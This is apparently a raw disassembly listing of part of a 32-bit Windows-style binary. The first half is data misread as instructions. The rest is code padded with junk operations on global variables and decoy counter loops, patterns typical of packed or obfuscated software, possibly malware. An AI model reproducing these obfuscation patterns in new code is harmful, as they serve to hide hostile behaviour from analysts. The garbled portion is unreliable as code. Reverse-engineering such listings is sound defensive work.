  408c57:	sub    bh,BYTE PTR [ebp+0x15]
  408c5a:	retf   
  408c5b:	retf   0xa8b9
  408c5e:	or     eax,0xc4bee878
  408c63:	out    0x85,eax
  408c65:	into   
  408c66:	fs sbb ch,bh
  408c69:	dec    ecx
  408c6a:	push   esi
  408c6b:	rol    DWORD PTR [ecx],0x67
  408c6e:	mov    ebp,0xce855b6
  408c73:	stos   BYTE PTR es:[edi],al
  408c74:	cmc    
  408c75:	mov    ?,ebx
  408c77:	lods   eax,DWORD PTR ds:[esi]
  408c78:	mov    dh,0x34
  408c7a:	imul   ecx,ebx,0x5c180aef
  408c80:	into   
  408c81:	jns    0x408c78
  408c83:	mov    al,0x55
  408c85:	(bad)  
  408c86:	(bad)  
  408c87:	in     eax,0xb
  408c89:	and    eax,0x690a95f2
  408c8e:	cmp    eax,DWORD PTR ds:0xb32103c7
  408c94:	cmc    
  408c95:	pop    ds
  408c96:	test   al,0xb9
  408c98:	mov    al,ds:0x9d23971e
  408c9d:	enter  0xdc2b,0x5c
  408ca1:	test   BYTE PTR [edi+0x6b3e60c3],al
  408ca7:	sub    al,0x4
  408ca9:	call   0x35770b64
  408cae:	mov    ds:0xa2db367c,eax
  408cb3:	fs inc esp
  408cb5:	mov    edx,0xaeba9a2
  408cba:	cmp    ebp,DWORD PTR [edi+0x17]
  408cbd:	retf   
  408cbe:	das    
  408cbf:	jge    0x408c64
  408cc1:	test   eax,0x64720c94
  408cc6:	(bad)  
  408cc7:	sti    
  408cc8:	xor    BYTE PTR [esi-0x7805498d],bl
  408cce:	push   ds
  408ccf:	and    DWORD PTR [eax+eax*8],ebp
  408cd2:	jb     0x408c64
  408cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd5:	call   0x1c4d9f01
  408cda:	dec    ebp
  408cdb:	sbb    eax,0x7e5348f9
  408ce0:	push   es
  408ce1:	add    DWORD PTR [ecx-0x5c6bd5b7],ebx
  408ce7:	loopne 0x408c92
  408ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cea:	xchg   BYTE PTR [ebx],bl
  408cec:	(bad)  
  408cee:	cmp    eax,0x7b9de52a
  408cf3:	out    0xb2,al
  408cf5:	test   BYTE PTR [ebx-0x23],0x91
  408cf9:	ret    
  408cfa:	xchg   ecx,eax
  408cfb:	pop    esi
  408cfc:	int3   
  408cfd:	repnz push ss
  408cff:	mov    bl,0xc8
  408d01:	scas   al,BYTE PTR es:[edi]
  408d02:	push   esi
  408d03:	arpl   WORD PTR ds:0xf92c97f6,si
  408d09:	xor    al,0xcc
  408d0b:	push   ds
  408d0c:	sbb    eax,0x7ba32784
  408d11:	cmp    edx,esi
  408d13:	mov    eax,edi
  408d15:	push   esp
  408d16:	cmp    DWORD PTR [edi-0x69],ecx
  408d19:	outs   dx,DWORD PTR ds:[esi]
  408d1a:	adc    DWORD PTR [ebp+0x5f31bb49],0x8974f3f1
  408d24:	dec    edx
  408d25:	sub    DWORD PTR es:[esi-0xe1db09e],edx
  408d2c:	sub    DWORD PTR ds:0xdf4b5031,ecx
  408d32:	or     bh,BYTE PTR ds:0xded7b923
  408d38:	je     0x408cef
  408d3a:	pop    ss
  408d3b:	xor    BYTE PTR [ebp-0x6a],0x2b
  408d3f:	pop    ebp
  408d40:	loope  0x408cf8
  408d42:	lods   eax,DWORD PTR ds:[esi]
  408d43:	call   0x79e3e8c5
  408d48:	mov    eax,0x43ddcd29
  408d4d:	stos   BYTE PTR es:[edi],al
  408d4e:	stos   BYTE PTR es:[edi],al
  408d4f:	dec    esp
  408d50:	dec    edi
  408d51:	dec    ebx
  408d52:	mov    dl,0x25
  408d54:	sbb    cl,BYTE PTR [edx-0x773269ac]
  408d5a:	cmc    
  408d5b:	icebp  
  408d5c:	out    dx,al
  408d5d:	leave  
  408d5e:	les    ebp,FWORD PTR ds:[ecx-0x6eb18ec1]
  408d65:	xlat   BYTE PTR ds:[ebx]
  408d66:	stos   DWORD PTR es:[edi],eax
  408d67:	(bad)  
  408d68:	fisttp DWORD PTR [eax]
  408d6a:	dec    edi
  408d6b:	mov    bl,0x76
  408d6d:	pop    ds
  408d6e:	adc    ebx,DWORD PTR [ecx-0x6b]
  408d71:	xor    al,ah
  408d73:	xlat   BYTE PTR ds:[ebx]
  408d74:	outs   dx,DWORD PTR ds:[esi]
  408d75:	adc    eax,0xd703cbc4
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	(bad)  
  408dab:	adc    bh,dl
  408dad:	jo     0x408d60
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408e1b
  408db7:	and    BYTE PTR [esi],ah
  408db9:	rcl    BYTE PTR [esi+0x7e],1
  408dbc:	sbb    DWORD PTR [ecx],ebp
  408dbe:	ficomp WORD PTR [edi+0x6d]
  408dc1:	jo     0x408d61
  408dc3:	ins    BYTE PTR es:[edi],dx
  408dc4:	lea    ecx,[edx+0x7e6a7a87]
  408dca:	dec    eax
  408dcb:	adc    DWORD PTR [edi+0x41d5053d],edx
  408dd1:	cs xor ah,0x38
  408dd5:	popa   
  408dd6:	repz cs fucomip st,st(5)
  408dda:	outs   dx,DWORD PTR ds:[esi]
  408ddb:	test   ah,al
  408ddd:	jne    0x408de0
  408ddf:	sub    eax,DWORD PTR [ecx]
  408de1:	ss test eax,0x963435dd
  408de7:	retf   0x7b50
  408dea:	or     DWORD PTR [edi+eiz*1+0x19825e5d],ebx
  408df1:	xchg   esp,eax
  408df2:	adc    al,0xa5
  408df4:	mov    ds:0x5723f88,eax
  408df9:	xor    eax,0x125ae874
  408dfe:	cwde   
  408dff:	shl    ebp,0x42
  408e02:	fs xchg ebp,eax
  408e04:	cmp    eax,0x73aab865
  408e09:	inc    ebx
  408e0a:	retf   0xa941
  408e0d:	outs   dx,BYTE PTR ds:[esi]
  408e0e:	arpl   bp,dx
  408e10:	shl    BYTE PTR [esi-0x5c],0x49
  408e14:	or     BYTE PTR [ebx],dl
  408e16:	shl    ebx,1
  408e18:	jbe    0x408de2
  408e1a:	jae    0x408e71
  408e1c:	dec    ebx
  408e1d:	mov    WORD PTR [esi+ebp*8+0x431c1a3a],?
  408e24:	aad    0xaa
  408e26:	pop    edx
  408e27:	pop    ds
  408e28:	dec    ecx
  408e29:	xor    al,0x9f
  408e2b:	test   al,0xcf
  408e2d:	hlt    
  408e2e:	outs   dx,BYTE PTR ds:[esi]
  408e2f:	or     BYTE PTR [ecx],ch
  408e31:	clc    
  408e32:	cmp    dh,BYTE PTR [ecx+0x77]
  408e35:	push   ss
  408e36:	xor    eax,0xf1d5d727
  408e3b:	retf   0xb823
  408e3e:	imul   ebp,edi,0x0
  408e41:	mov    WORD PTR [edx+ebp*2-0x61d942de],?
  408e48:	add    al,BYTE PTR [edi+0x55]
  408e4b:	aas    
  408e4c:	jb     0x408dce
  408e4e:	sub    DWORD PTR [eax+0x19],edx
  408e51:	push   cs
  408e52:	add    edi,edi
  408e54:	test   eax,0x84212cc7
  408e59:	add    eax,edi
  408e5b:	idiv   BYTE PTR [ebx+0x6e]
  408e5e:	jmp    0x3c0f:0x121d8877
  408e65:	mov    eax,0x4e1f6d88
  408e6a:	and    al,0x5d
  408e6c:	jne    0x408e4c
  408e6e:	rcl    BYTE PTR [ebp+0x3f],0x2b
  408e72:	clc    
  408e73:	lahf   
  408e74:	sbb    BYTE PTR [edi-0x6c],dl
  408e77:	loope  0x408e20
  408e79:	test   BYTE PTR ds:0x6af7218d,ah
  408e7f:	push   ebx
  408e80:	daa    
  408e81:	arpl   sp,cx
  408e83:	fdiv   QWORD PTR [ecx+0x2ffe117a]
  408e89:	in     eax,0x48
  408e8b:	outs   dx,BYTE PTR ds:[esi]
  408e8c:	int3   
  408e8d:	repnz popa 
  408e8f:	dec    ecx
  408e90:	xchg   edx,eax
  408e91:	out    0x34,eax
  408e93:	xchg   edx,eax
  408e94:	lea    edx,[ebp+0x35]
  408e97:	popf   
  408e98:	jle    0x408f17
  408e9a:	sbb    bl,al
  408e9c:	retf   
  408e9d:	sub    al,bl
  408e9f:	in     eax,0x64
  408ea1:	or     dh,BYTE PTR [ebp+0x20035576]
  408ea7:	(bad)  
  408ea8:	pop    esi
  408ea9:	fadd   QWORD PTR [ebx+0x3d3a566d]
  408eaf:	jmp    0x47e23b5c
  408eb4:	in     eax,0x75
  408eb6:	mov    ebp,0x7bbc348f
  408ebb:	lds    ebx,FWORD PTR [eax-0x66]
  408ebe:	dec    esi
  408ebf:	cmp    DWORD PTR [ecx],edi
  408ec1:	mov    ss,WORD PTR gs:[edx-0x4c49e434]
  408ec8:	cmp    eax,edx
  408eca:	jecxz  0x408edc
  408ecc:	bound  ebx,QWORD PTR [ebx+0x2e819fd2]
  408ed2:	cmc    
  408ed3:	inc    ecx
  408ed4:	push   edx
  408ed5:	(bad)  
  408ed6:	aad    0x8
  408ed8:	mov    edx,0x8c67acb0
  408edd:	aam    0x92
  408edf:	mov    ecx,0x1432e8aa
  408ee4:	add    bh,BYTE PTR [eax]
  408ee6:	loope  0x408e98
  408ee8:	js     0x408e7c
  408eea:	add    edi,esp
  408eec:	mulps  xmm2,xmm7
  408eef:	jp     0x408ee8
  408ef1:	into   
  408ef2:	int3   
  408ef3:	test   DWORD PTR [esi+0x6c4d8d1e],ebx
  408ef9:	inc    ebp
  408efa:	cmp    ebp,ebx
  408efc:	push   ss
  408efd:	add    BYTE PTR [edi+ebx*4+0x4ba25cb0],0xa5
  408f05:	jmp    ebx
  408f07:	and    ebx,eax
  408f09:	imul   ebx,DWORD PTR [edi],0x71
  408f0c:	inc    edi
  408f0d:	retf   0x49c7
  408f10:	jle    0x408e9b
  408f12:	div    ecx
  408f14:	test   eax,0x57e91231
  408f19:	push   eax
  408f1a:	lea    ecx,[edx+0x46f966e4]
  408f20:	call   0xcafe9c56
  408f25:	mov    ebp,0x82f49339
  408f2a:	in     eax,dx
  408f2b:	jno    0x408ece
  408f2d:	inc    esi
  408f2e:	nop
  408f2f:	pop    edi
  408f30:	mov    ah,BYTE PTR [eax+0x46]
  408f33:	adc    BYTE PTR [ebx],al
  408f35:	or     ch,BYTE PTR [esi-0x2b]
  408f38:	aad    0x52
  408f3a:	sbb    al,0xb1
  408f3c:	cmp    eax,edx
  408f3e:	push   edx
  408f3f:	inc    eax
  408f40:	pop    edi
  408f41:	out    dx,al
  408f42:	inc    BYTE PTR [edx-0xf]
  408f45:	jmp    0x408f8d
  408f47:	mov    bh,0x6c
  408f49:	pop    es
  408f4a:	mov    ebx,DWORD PTR [ebp-0x8]
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	adc    eax,0xcdc9142a
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f22
  408f6d:	(bad)  
  408f6e:	in     al,0xce
  408f70:	or     al,0x6e
  408f72:	outs   dx,BYTE PTR ds:[esi]
  408f73:	sub    al,0x7
  408f75:	in     al,0x88
  408f77:	add    al,0x7e
  408f79:	sbb    eax,0x42b7861
  408f7e:	add    al,0xe3
  408f80:	adc    edi,DWORD PTR es:[ebp+0x30b455ff]
  408f87:	mov    esp,0x96f26fe0
  408f8c:	sub    al,BYTE PTR [ecx]
  408f8e:	jecxz  0x408fd8
  408f90:	inc    ebx
  408f91:	dec    eax
  408f92:	aad    0xe2
  408f94:	jg     0x408f5a
  408f96:	loop   0x408fef
  408f98:	outs   dx,BYTE PTR ds:[esi]
  408f99:	add    eax,0x34b0b77
  408f9e:	push   ebp
  408f9f:	(bad)  
  408fa0:	mov    ch,0xd5
  408fa2:	mov    ebx,0x258173b9
  408fa7:	or     DWORD PTR [ebx],0xd4c866bb
  408fad:	repnz mov al,0x4f
  408fb0:	in     al,0xd9
  408fb2:	idiv   esi
  408fb4:	rcl    DWORD PTR [eax],1
  408fb6:	mov    ds:0xd9c5b952,al
  408fbb:	clc    
  408fbc:	push   es
  408fbd:	inc    esp
  408fbe:	out    0xf8,eax
  408fc0:	dec    esi
  408fc1:	arpl   WORD PTR [edi+esi*2+0x57],di
  408fc5:	adc    esp,DWORD PTR [ecx+edi*4]
  408fc8:	mov    DWORD PTR [esi],ebx
  408fca:	jecxz  0x408fab
  408fcc:	sbb    edi,edi
  408fce:	mov    ecx,ds
  408fd0:	mov    WORD PTR [edx-0x1dde9d60],?
  408fd6:	div    cl
  408fd8:	mov    esp,0xae6551e
  408fdd:	pop    eax
  408fde:	retf   
  408fdf:	adc    al,0x76
  408fe1:	stc    
  408fe2:	add    bl,BYTE PTR [ecx-0x52]
  408fe5:	push   edi
  408fe6:	call   0x7b5e:0x9c7f201d
  408fed:	mul    dl
  408fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ff0:	stos   DWORD PTR es:[edi],eax
  408ff1:	push   edx
  408ff2:	push   DWORD PTR [edx]
  408ff4:	in     eax,dx
  408ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ff7:	fdivr  QWORD PTR [ecx]
  408ff9:	hlt    
  408ffa:	jmp    0x408fcb
  408ffc:	cmp    bl,BYTE PTR [edi+0x15]
  408fff:	sub    eax,0xcb225e51
  409004:	xor    esi,edi
  409006:	leave  
  409007:	loope  0x409034
  409009:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40900b:	stos   BYTE PTR es:[edi],al
  40900c:	mov    dh,BYTE PTR [ebp+0x70299b27]
  409012:	popf   
  409013:	(bad)  
  409014:	(bad)  [edx+0x47]
  409017:	push   ebp
  409018:	test   DWORD PTR [esi],0x28445aca
  40901e:	jl     0x409069
  409020:	imul   edi,DWORD PTR [edx-0x61],0x25d22c2f
  409027:	push   esp
  409028:	xchg   esi,eax
  409029:	dec    ebp
  40902a:	cdq    
  40902b:	adc    DWORD PTR [ecx+0x2fc13357],edi
  409031:	out    dx,eax
  409032:	adc    DWORD PTR [ecx-0x6],esi
  409035:	stc    
  409036:	jge    0x408fe8
  409038:	sub    DWORD PTR [edx-0x88f40ce],0xcfb21b89
  409042:	cmp    dh,BYTE PTR [ebp+0x241a3a56]
  409048:	mov    bh,0x76
  40904a:	lahf   
  40904b:	call   0x498daa1c
  409050:	xchg   ebx,eax
  409051:	xchg   esi,eax
  409052:	push   cs
  409053:	mov    eax,ds:0xefe5fda
  409058:	add    edi,DWORD PTR [ebx-0x1ef1508]
  40905e:	adc    esi,DWORD PTR [eax]
  409060:	push   edi
  409061:	aas    
  409062:	mov    bh,0x46
  409064:	iret   
  409065:	bswap  edx
  409067:	adc    al,dl
  409069:	test   BYTE PTR [esi],bh
  40906b:	lds    ebx,FWORD PTR [eax+edx*2+0x79b6e002]
  409072:	jecxz  0x409098
  409074:	dec    edx
  409075:	push   ss
  409076:	call   0x9fd4:0x7f061cff
  40907d:	add    eax,0x92efa9e8
  409082:	inc    eax
  409083:	xor    DWORD PTR [eax],ebx
  409085:	jmp    esp
  409087:	dec    ebp
  409088:	xchg   BYTE PTR [eax],al
  40908a:	fstp   TBYTE PTR [eax]
  40908c:	adc    BYTE PTR [edi],bh
  40908e:	xchg   ecx,eax
  40908f:	jmp    DWORD PTR [edx+esi*1+0x3e35c6c6]
  409096:	jp     0x40903f
  409098:	and    edi,ecx
  40909a:	inc    edi
  40909b:	jne    0x40905e
  40909d:	inc    edx
  40909e:	sub    BYTE PTR [ecx],bl
  4090a0:	cmp    cl,bh
  4090a2:	call   0xa208:0x4f8607fd
  4090a9:	sub    ecx,ebp
  4090ab:	hlt    
  4090ac:	fidivr WORD PTR [ecx]
  4090ae:	sub    bh,ch
  4090b0:	repz xchg esp,eax
  4090b2:	push   ss
  4090b3:	sub    bl,BYTE PTR [eax]
  4090b5:	pop    edx
  4090b6:	add    al,dh
  4090b8:	inc    esp
  4090b9:	mov    DWORD PTR [ecx-0xb074d46],edx
  4090bf:	push   ebx
  4090c0:	mov    cl,BYTE PTR [edx]
  4090c2:	fmul   QWORD PTR gs:[ecx-0xc333208]
  4090c9:	mov    BYTE PTR [edi],dl
  4090cb:	pop    esp
  4090cc:	mov    ebx,DWORD PTR [edx]
  4090ce:	nop
  4090cf:	nop
  4090d0:	into   
  4090d1:	pusha  
  4090d2:	repz mov edi,0xe4057e84
  4090d8:	sub    al,0x16
  4090da:	cmp    DWORD PTR [edi-0xae10717],esp
  4090e0:	xchg   BYTE PTR [edi-0xc],dl
  4090e3:	ss or  ch,0x7
  4090e7:	jno    0x40906b
  4090e9:	repz pop DWORD PTR [ecx]
  4090ec:	xchg   ecx,eax
  4090ed:	loop   0x40909f
  4090ef:	stos   BYTE PTR es:[edi],al
  4090f0:	jl     0x40913c
  4090f2:	cmp    DWORD PTR [ebx+0x1d757be],0xa1d0b925
  4090fc:	inc    ebx
  4090fd:	retf   
  4090fe:	mov    cl,0x77
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
